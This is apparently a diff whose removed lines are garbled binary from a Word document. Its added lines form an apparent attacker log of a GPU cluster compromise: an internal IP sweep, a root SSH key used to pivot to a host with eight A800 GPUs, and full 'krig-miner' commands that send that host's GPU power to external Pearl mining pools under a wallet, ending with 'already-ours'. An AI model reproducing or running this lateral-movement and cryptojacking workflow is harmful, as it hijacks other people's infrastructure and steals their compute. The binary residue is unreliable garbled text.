-y«ö<^ï´c:ôŞØëaÚ¥¬­Úœ»·\A92¨Dìó•,´ptL|„-?’:UomyÜì^İµw÷§Ms÷Şò„ì¾X‹¶~c7Ù=äeÕÙı`ËMf<ÁÁbØi{•ÁiŸ,œ&u*{ÉKÀtÛôPqğ(5SSàö(NÙvş¢S²Göõ¿PK    ‡Nâ@" „  Y     word/settings.xmlµV[Oã8~_iÿC”}İ’¦fMm¹ˆ»eÁ›“8­©/‘í4´¿~c»)0 ÑŒ¶/Ïå;>wùúÌh°ÂRÁÓ0Şë‡æ¹(Ÿ§á·»Iïs(x¨à8×X…_şüãK“(¬5ˆ©  ¸JX†­«$ŠT¾À©=QaÌRH†4å<bH.ëª—V!M2B‰^Gƒ~ÿ0t0"kÉÑc$—B‰R•D”%É±ûóògìZÍ‘Èk†¹n-FS¸ƒàjA*åÑØ¯¢‹²úÈ‰£^®‰ûI:w!‹­ÆÏ\Ï(TRäX)H£Ö]†ßÂÄÃ7@ÛPïA¨#k;2P ÷Û¯îæŠ¾ÑÿA¶m¯H&‘´i†Ø¹E¥Nk¥!¶xMÓì5•ÚË¹»ÄNÖâıXR°<¹˜s!QF¡<›xAmn„`A“TXæn(ì¸F†‘?Pí#q-ô¬–RÔ¼8Çh ¾BàUü¾àDıF°p5u+™›z$Ì¡èslj-é—¨¦úe3-*on8ğl‰ÈÖ™$Å=–šäˆÎ*”É‹Æ‡önQEës!ÉFpè¨ÓC3¯½†‡¶òö=éEÏH¢uæOÁ„ÔcšÖ•PY·5Ïuİ6Õ+!:bp+M ı	ÔH±Á+jë¨¶ª˜;¼„yIô(/ôì„17©Œ¯ĞZÔº-Ë™Ùé¸1¨Kui*
-«–d[–~¨½Û&FÁVĞd;ä^ È1†: x¦×O À3²ÁÇ¼¸„v 0ãlXı] scùfóİºÂŒtùüw?2V˜F›PRM	4›¼à´ÄÿfŒ”%–`€ §ĞkDŠ¦³mñßµ•Ú•ôı=’ÊT˜ıÜ-%&`cj´-	¼¾gtyñ$Èõ÷û§ë³ñó7Ó»“åãÓx=ış0xØÌ‡ƒGv3º\>l&äñ)'å?ijÂ–wìÁ¶.ZÃæã_h;_y}÷³1\ÏÆƒñáhä†Û.çÓÉøSÿs|ìÌ8l–˜}fú‘%™\0[İ†Ñ†´çÌêÌ3{=ËPQ:1âí$b‰™\#\¶ÊtŠä¼Ãuò‡T˜—[,3Ò±<ƒÙ]YkD•­,o.áúŠ0OWu6óZvÒ«æÅÍJ¶QèœoO™¶C¯P7‰1ï}›™äb¤ô±"°¼6‹ŞéµÑ†¡rf^@xŠªÊÎïl§!%ó…š†S/¡öÍ7hyp2¼ö€rã,H»#`?AÊ}t´}OÛïh°ç­Ü°£xÚAG;ô4x‰5É&ƒ¤„/aüùOC/¥¢ÁÅ¹'¦á’‚Z 
-CªÍÊƒZIKp;P%¡4TÀãí¯Iû[Zjóà”b	3YÃ._%F40¯Sà”°láQ³fÿï6Ã«ÄJÍ¶@›ÇWF··€İ	Ë X%øÖ3.ˆ1$`O1T½ ¦‰İ“ rhV¹mÉW>B“ú7ñÑPK    ‡Nâ@$`ı  t     word/footnotes.xmlµ”ÉnÛ0†ïòïÖâ,(Ë9Äh[Ñ´@S”EDä$eÖoß¡6;‘adA/ÚÈùæÿ‡šYİÿ•M´çÆ
-PÉâ”D\1(…ÚäÏï‹ï$²ª’6 xAÜ’ûõÕ·•Ï+ §Àq!CÙÜkVÚ9'‰e5—ÔÆR0*3	T•`<ñ`Êd™fi÷¤0n-&| jO-prNÍæªÀHêlf—Hj^Z½@º¦NlE#ÜÙéİˆ‚´Fåƒ Å$(„ä½ á6F˜™‹3yûÈ°VråºŒ‰áj ek¡6>KC‹õ(iÉÄ^6ã>¯³›Y¾Éò{Î`c¨Ç£8g¸3Å(û Ùôuç{<Õ·Ä÷ _F®¤BMÂ>gô¤TÙíLÉÅJ-»¿õ^:•á×
-== /root/conf/é›†ç¾¤åŸºç¡€æ•°æ®æµ‹è¯•.docx
-PK
-     ‡Nâ@            	   docProps/PK    ‡Nâ@›A’&  ¥     docProps/app.xmlÍNÃ0„ïH¼Cä{âŸ&m¨œT!¥'$*5…ce9›Ö"±­ØTíÛc@¸rœ™Õ§Ùá«ËĞGg2º@4!(-M«ô±@ûfç(r^èVôFC®àĞª¼½áÛÑX½„v:yo—;y‚A¸$Ä:$áƒØt’°6òm í1#dáâA·ĞÆöˆ¾ˆË³ÿ/´5ò£Ÿ{n®6.yc¼è5@ÉhÎñ$ùNŠêp\v¢wÀñdğG¥_İŞ6f-<|çM^YÛ+)|Ø¯|Ùî¢§Ï”%aÌ„ÎSº8lèÃŒ-îë˜Íïê8em\ÑŒÅ$«³”ä„°ºâø7‰ãißòPK    ‡Nâ@İÍQÃH  b     docProps/core.xml}’]KÃ0†ïÿCÉ}›¤"¥íğƒ])VïBr¶›’ÌnşzÓn«ÅËä}ÏsŞ““j¾U]òÎK£kD3‚ĞÜ©W5znéJ|`Z°Îh¨Ñ<š7çg·%7±à‚ŸD’ö%·5Z‡`KŒ=_ƒb>‹Å¥qŠ…xt+lg+À9!—XA`‚†`j'": Ÿvãº 8†èà1Í(şöpÊÿY0*'N%ÃÎÆ™qOÙ‚ïÅÉ½õr2ö}ŸõÅ#æ§øõáşi5•zx+¨©Û•Ü ’(÷íÊKq{×.P““¼Hi’¼¥¤¤%!o>ºõpÏ2®¹JjéƒcÁ¸Á:)ÃZ:æÃCÜàR‚¸Ù5Ÿk³©ğïû)¡:xÿ8KÉ,-HK‹2‹“ˆG@3¶ùù+š/PK    ‡Nâ@Ò| *       docProps/custom.xml¥‘MOƒ@†ï&ş²÷e?(P é.š¨½²,-	ìv©6Æÿî6µ^ô8y'Ï<3“®_‡Ş;ÈÉtZe€øxR	İtj—§Ç
-.gl­šº×Jfà(Xç×Wéı¤G9ÙNÏ!”ÉÀŞÚq…{9ÔÆw±rI«§¡¶®œvH·m'd¡Å<HeÅ8Bb6VpüÂ3ou°E6ZœìÌöñ8:İ<ı„½v°]“·"äEâÒ2á`Â`$1ÄKŒ)£¼J6å;ğÆS3ª·úíÃÃ6³°lîúf+'‡>ØU?¾;å‡ê»ú$Z8EßaŠ.ÿ´	.67|ûc|…¬b”1Bãß”ğ€2^ò(¨x?ú›:]ëüËüPK
-     ‡Nâ@               word/PK    ‡Nâ@€ÿTzı  Á[     word/styles.xmlÍ\[sÛº~ïLÿ‡Oíƒ#ËrìÄåŒ-Çu¦vêÙç<C$dñ˜$X^,;¿¾‹HQ¼€ÂòL§ÉƒEŠ»ßbwñá"p¿üò…Î+O³@ÄswúáØuxì	?ˆŸçîÓãÍÑ'×Érû,1Ÿ»ï<sùú×¿|Ù^dù{È3ÄÙEäÍİM'“IæmxÄ²"á1|¹iÄr¸LŸ'K_ŠäÈQÂò`„Aş>99>>sµ1w‹4¾Ğ*¢ÀKE&Ö¹¹ëuàqı§”HÁU’×Â+"çˆ8Iy6ˆ8ÛIVj‹¨Ú ‰›RÉ«©¯QX>·=l+R?I…Ç³b…Êøˆq¥fzÚRT9î8n¢š?‘ª@|zŒŸjvLMk·Ké2[ˆÑVQ¼V)KU˜!jv'Ù¢Èr]³œUú¶Ûí‡m’}ğbmv-jÓÙ¾Ú	¹Nä]|EÊV!$çvzê~…Ìô…wÍ×¬óL^¦©¾ÔWøçFÄyæl/XæÁ#¤,(ˆĞu{gßlä‡Îo8ËòË,`õ/¿é{RÒËòšÂ«ÀÜÉ×/4¥ü[3)©TO5ì‡<…¬]ªîÊEçs÷äú*´•¯ÿ}ƒ]lî–7âMàóß7<~Ê¸İZ?¸äQpø>—]]ß{úş"…8w?Ö7ï„÷ÂıeÀR«ôW˜ùßŞ<È.°ÿ)1QOÑ DCŠ`§od5x¼3éôÒúP:h,
-šßƒ²áL’š3=¨f9êT†–*NÆ«˜Wq:^ÅÇñ*ÎÆ«8¯âÓxŸ;UÔsXõ•
-Aìó·\2Ët'Y¦;[Ì2İéa–éÎ³Lw˜eº#n–é±Yf8¦³Z÷Î…w@D›ÃñlJG³)1Ë¦Äp$›ÃqlJG±)1Ã¦Äpë½R$ÎwèœqnÕŸ×Bä±È¹“ó7;IƒN$íeå€ÂSkC-EWéÁ«¬1˜×F¿ÙG9#Pœç1ü;5ôõÃ\NÌ±vÖÁs‘ÂÚ¡k”ïæñ+a^é0ßY¢pÊsXRXWÙò5Oa=Ä­Äk)AS1wâ"ZYF:aÏ$9û˜ü4kKië®S%+òœ‚–	1XZ…&Ì1õ„¾T¼2;ZÎU†œ ÷Ã>ôˆ7<ÕÙE†£–È©•Çex8j¡(ß9„&iIBË´$¡Z’ĞNkJ;µ$¡Z’ĞN-ÙİÎÆ02´&4­Öƒ<´#İE(ä‰Un.ƒç˜Áè0Œ„«\5êu»óÀRöœ²dãÈ+Ü+á¿;¶3JŠ2ÁÁn¸ Cƒ¸nn«7–’”<­d	™ZÉrµ’íÎÖ>ª¿‡™†Goû'g–‰>ÅìéÙ—X«Ü:Ù—,,Ô¤Ó*ï`£Í.ö»”»	RĞ3ën–yôCNÍe@l{øİn ÙÉÙ%íNN¹Ê²-qKôöíú‰¥‘¶µi¾êï=zûğ¦¤/V¹v#ÂPl¹o–n˜44dœœÈåHË<=€-Œi»ò[”lXdVŞ(7±{–X	>„°cŞÒ>ûv;í¡sø Wg|½ŒşÛï|õw+coïïœK˜“ÇïA°ÊCÄE`IkJJøvdˆR0ú1¬T„İŠeÿÉßW‚Á¯(6‹`”|€•îñçœ ½dQb9›BÔGèø[X–Y®BQö7–ríßÙÖFwl‘šhé4|ìUÓ—üµõwV¬şàİì¡ëH§°!Xï9{¢v#Î¨í+ÑEÈà'ÂC¶0Û—²“KÙ16ÛÍît{E(Òu’B´(…I-.…IMaÅÕj”%²cl&†	qí&á*ÄÿHŸä(¤x	).BAŠPìœá]ûvgGÄáÍûÁá=ü¶ .>»xíãp• (H‰#
-Râˆ‚”8¢ %(H‰#
-Râˆ‚”8Î®¾^ÃxJ£¯š8%¦5qJdåv 8+’¾wÎJÌ©ø-äÏÌrŸG%ñC*Öòôˆ{N9˜åu"¢D)Î†¹?‰y¥Ï.ªW˜p¥w­1ËZ[ªŸ{Ö–»ñˆ:xJ¨[nÈ(uÆ§Ç¨»ày“;Ëa[dP¿ikJé—lA4Ş´ZWÊåXDT>3lÜs?(¢Ò5}‰<èœÓÃ!zr~_í‰¯nÒuÏè9¨NVön˜ÔõSí?ÖóªıpütÈ~ÔOµßô#„öêïá¦!ÿŸ›v’®á4¬Cï^ç¦¾[-pFÑÃ¹©W#š`êÄ•ş$arÿ}Â¶•‡FÈTaŠÅGÇ¢˜Â±#Ô±(¦ 4™u,–ÅÅ:˜kÇLºcfß±@ÓğX ƒùx$ĞaÄ<ÄÄ
-½i†‹eâ†
-çã¨îÜDšã€Ÿû–®£NLaj“7Å 6ySQLÑé#o*…¼©XÖäM²&o*5yS¬É›
-dMŞD ;ò¦‚˜X¡â¹yS±LÜPaÕÉ›
-d¢‡
-¨NŞD {ò&®°ÎLaj“7Å 6ySQLÑé#o*…¼©XÖäM²&o*5yS¬É›
-dMŞD ;ò¦‚˜X¡â¹yS±LÜPaÕÉ›
-d¢‡
-¨NŞD {òîùÅlh{Ì’¼©(¦ µÉ›ŠbŠNyS±(äMÅ²&o*5yS¬É›
-dMŞT kò&Ù‘7„BŞT,7TœZ'o*‰* :yìÉ»çÔÂŸLŞTS€ÚäME1E§¼©Xò¦bY“7Èš¼©@ÖäM²&o*5yìÈ›
-B!o*–‰*N­“7ÈDP¼‰@öäİsrìO&o*Š)@mò¦¢˜¢ÓGŞT,
-yS±¬É›
-dMŞT kò¦Y“7Èš¼‰@väM¡7ËÄ§ÖÉ›
-d¢‡
-¨NŞÕºê…·du*¬xç‘rx1fî&åÀòˆ”á’õÆt]-|ğ;VŞ’rò}xæ•AÙ´zµ+¨{ ~å 
-õğ }d?ïN…–¢Çê¤T“J·/¶òPk*ÂÆYÌ’G-Ò¨Z4K˜'‹`m/Vò…"h„pØ^ò)/dõ‰¹;›b|äÅ¯…,®&Uüá•x!_çòøJ[µÖ¤qéÿ¾ºš,Œo„”¦ÍğŸ2ø…§²fú_ÿ‘ı¬nTw²œz¨üÕƒ¡³ğ–2Ôeñ·¹ûss´ø!o­ Âx(=Z^jw À-˜	íÜñ6<|³
-¤{rç#Ö]«ç¼|&“¬óÕóİB•={€„ÂCyıFæøæU¿³–íW¶Z)>l§¹ÀÛØš|ªTƒ†÷/	•ñä—ê¨şS22]Õ·Óc ß¯DåûåS<p‹ê»€'ëÆ¨Kid¿‹÷8¤b“–ckõVjúı«Êg}°2†j`8fª¾Õrı€c•t?~á<ù:Ñ×òâˆ Ã«6‰ ¯5‡àgE!§ÊÉf
-‘§îÊE‘Ë‡ï^÷	Ü·Ï.+´cµPöìuûé¥ü¯š²ëã§úm‡ìç®«{ { «V½ 
-*2Yï˜ÍãáémxË€ÀôV¦_AN(Ö*	Ee:\¾€W-!şè‹¹»¸Z\_«±ü'ĞºüFFX\º'¥«~B”/ûQ<€²œ>¿-Óİ¾õJÁoTªcW¡P—šŒ<õ÷õ2„Ú"%À.Çå³ø|8dh¨rî¬E	ë)§×Ÿ­”Û¯Ô‰ù5@:õÀ¾×Ù?Í˜fXît!Ç_(äº_/ (½ ã$1§§²ZÔM†ê*aà×.e	a¾SG>Ši²fÀ
-y«ö<^ï´c:ôŞØëaÚ¥¬­Úœ»·\A92¨Dìó•,´ptL|„-?’:UomyÜì^İµw÷§Ms÷Şò„ì¾X‹¶~c7Ù=äeÕÙı`ËMf<ÁÁbØi{•ÁiŸ,œ&u*{ÉKÀtÛôPqğ(5SSàö(NÙvş¢S²Göõ¿PK    ‡Nâ@" „  Y     word/settings.xmlµV[Oã8~_iÿC”}İ’¦fMm¹ˆ»eÁ›“8­©/‘í4´¿~c»)0 ÑŒ¶/Ïå;>wùúÌh°ÂRÁÓ0Şë‡æ¹(Ÿ§á·»Iïs(x¨à8×X…_şüãK“(¬5ˆ©  ¸JX†­«$ŠT¾À©=QaÌRH†4å<bH.ëª—V!M2B‰^Gƒ~ÿ0t0"kÉÑc$—B‰R•D”%É±ûóògìZÍ‘Èk†¹n-FS¸ƒàjA*åÑØ¯¢‹²úÈ‰£^®‰ûI:w!‹­ÆÏ\Ï(TRäX)H£Ö]†ßÂÄÃ7@ÛPïA¨#k;2P ÷Û¯îæŠ¾ÑÿA¶m¯H&‘´i†Ø¹E¥Nk¥!¶xMÓì5•ÚË¹»ÄNÖâıXR°<¹˜s!QF¡<›xAmn„`A“TXæn(ì¸F†‘?Pí#q-ô¬–RÔ¼8Çh ¾BàUü¾àDıF°p5u+™›z$Ì¡èslj-é—¨¦úe3-*on8ğl‰ÈÖ™$Å=–šäˆÎ*”É‹Æ‡önQEës!ÉFpè¨ÓC3¯½†‡¶òö=éEÏH¢uæOÁ„ÔcšÖ•PY·5Ïuİ6Õ+!:bp+M ı	ÔH±Á+jë¨¶ª˜;¼„yIô(/ôì„17©Œ¯ĞZÔº-Ë™Ùé¸1¨Kui*
-«–d[–~¨½Û&FÁVĞd;ä^ È1†: x¦×O À3²ÁÇ¼¸„v 0ãlXı] scùfóİºÂŒtùüw?2V˜F›PRM	4›¼à´ÄÿfŒ”%–`€ §ĞkDŠ¦³mñßµ•Ú•ôı=’ÊT˜ıÜ-%&`cj´-	¼¾gtyñ$Èõ÷û§ë³ñó7Ó»“åãÓx=ış0xØÌ‡ƒGv3º\>l&äñ)'å?ijÂ–wìÁ¶.ZÃæã_h;_y}÷³1\ÏÆƒñáhä†Û.çÓÉøSÿs|ìÌ8l–˜}fú‘%™\0[İ†Ñ†´çÌêÌ3{=ËPQ:1âí$b‰™\#\¶ÊtŠä¼Ãuò‡T˜—[,3Ò±<ƒÙ]YkD•­,o.áúŠ0OWu6óZvÒ«æÅÍJ¶QèœoO™¶C¯P7‰1ï}›™äb¤ô±"°¼6‹ŞéµÑ†¡rf^@xŠªÊÎïl§!%ó…š†S/¡öÍ7hyp2¼ö€rã,H»#`?AÊ}t´}OÛïh°ç­Ü°£xÚAG;ô4x‰5É&ƒ¤„/aüùOC/¥¢ÁÅ¹'¦á’‚Z 
-CªÍÊƒZIKp;P%¡4TÀãí¯Iû[Zjóà”b	3YÃ._%F40¯Sà”°láQ³fÿï6Ã«ÄJÍ¶@›ÇWF··€İ	Ë X%øÖ3.ˆ1$`O1T½ ¦‰İ“ rhV¹mÉW>B“ú7ñÑPK    ‡Nâ@$`ı  t     word/footnotes.xmlµ”ÉnÛ0†ïòïÖâ,(Ë9Äh[Ñ´@S”EDä$eÖoß¡6;‘adA/ÚÈùæÿ‡šYİÿ•M´çÆ
-PÉâ”D\1(…ÚäÏï‹ï$²ª’6 xAÜ’ûõÕ·•Ï+ §Àq!CÙÜkVÚ9'‰e5—ÔÆR0*3	T•`<ñ`Êd™fi÷¤0n-&| jO-prNÍæªÀHêlf—Hj^Z½@º¦NlE#ÜÙéİˆ‚´Fåƒ Å$(„ä½ á6F˜™‹3yûÈ°VråºŒ‰áj ek¡6>KC‹õ(iÉÄ^6ã>¯³›Y¾Éò{Î`c¨Ç£8g¸3Å(û Ùôuç{<Õ·Ä÷ _F®¤BMÂ>gô¤TÙíLÉÅJ-»¿õ^:•á×
---- plh logs
-total 824
-drwxr-xr-x 2 root root  4096 Nov 25 02:39 .
-drwxr-xr-x 4 root root  4096 Nov 25 03:06 ..
--rw-r--r-- 1 root root 87893 Nov 25 02:39 g0.log
--rw-r--r-- 1 root root 86431 Nov 25 02:39 g1.log
--rw-r--r-- 1 root root 85927 Nov 25 02:39 g2.log
--rw-r--r-- 1 root root 93628 Nov 25 02:39 g3.log
--rw-r--r-- 1 root root 92289 Nov 25 02:39 g4.log
--rw-r--r-- 1 root root 92500 Nov 25 02:39 g5.log
--rw-r--r-- 1 root root 92205 Nov 25 02:39 g6.log
-stratum+ssl://prl-sg.kryptex.network:8048
-### PEERS
-### DONE-POSTPLANT
+/root/conf/ubuntu_rsa:
+total 20
+drwxr-xr-x  3 root root 4096 Apr 18  2026 .
+drwxr-xr-x 10 root root 4096 Apr 18  2026 ..
+drwxr-xr-x  2 root root 4096 Apr 18  2026 orig
+-rw-r--r--  1 root root 1600 Apr 18  2026 ssh_config
+-rw-r--r--  1 root root 3514 Apr 18  2026 sshd_config
+/root/conf/root_rsa/ssh_config -> notakey
+/root/conf/root_rsa/sshd_config -> notakey
+/root/conf/ssh_rsa/ssh_config -> notakey
+/root/conf/ssh_rsa/sshd_config -> notakey
+/root/conf/ubuntu_rsa/ssh_config -> notakey
+/root/conf/ubuntu_rsa/sshd_config -> notakey
+/root/.ssh/id_rsa -> SHA256:tn2N+uRagAuM0t3vwsZNGFwY1OJcX2Ec36EIzBKV0ns (RSA)
+### SWEEP22
+11.9.141.130
+11.9.141.146
+11.9.141.162
+11.9.141.178
+11.9.141.194
+11.9.141.210
+11.9.141.226
+11.9.141.242
+192.168.0.20
+192.168.0.21
+192.168.0.22
+192.168.0.23
+192.168.0.28
+192.168.0.30
+192.168.0.31
+15
+### KEY-LADDER
+11.9.141.130 root /root/.ssh/id_rsa
+### PER-HOST
+########## 11.9.141.130 (root)
+Warning: Permanently added '11.9.141.130' (ED25519) to the list of known hosts.
+g0023
+8
+0, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
+1, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
+2, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
+3, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
+4, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
+5, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
+6, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
+7, NVIDIA A800-SXM4-80GB, 6327 MiB, 100 %
+./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g0 --password x -d 0 --api-port 1260
+./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g1 --password x -d 1 --api-port 1261
+./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g2 --password x -d 2 --api-port 1262
+Warning: Permanently added '11.9.141.130' (ED25519) to the list of known hosts.
+gpus=8
+4030237 ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g0 --password x -d 0 --api-port 1260
+4030238 ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g1 --password x -d 1 --api-port 1261
+4030239 ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g2 --password x -d 2 --api-port 1262
+4030243 ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g3 --password x -d 3 --api-port 1263
+4030248 ./krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g4 --password x -d 4 --api-port 1264
+already-ours
+### DONE-FARM
